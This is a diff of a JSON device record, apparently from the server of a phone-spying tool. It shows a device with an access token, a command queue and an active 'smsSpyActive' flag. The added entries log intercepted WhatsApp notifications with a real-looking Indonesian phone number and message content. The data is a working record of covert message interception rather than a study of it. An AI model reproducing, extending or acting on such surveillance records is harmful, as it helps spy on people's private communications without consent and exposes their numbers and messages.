@@ -146,7 +146,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777289662942,
+    "lastSeen": 1777289664655,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -162,6 +162,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-7933-3065",
+        "content": "Cilll",
+        "time": "27/04 18:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777289665390
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎137 pesan dari 2 chat",
+        "time": "27/04 18:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777289663322
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 831-7933-3065",
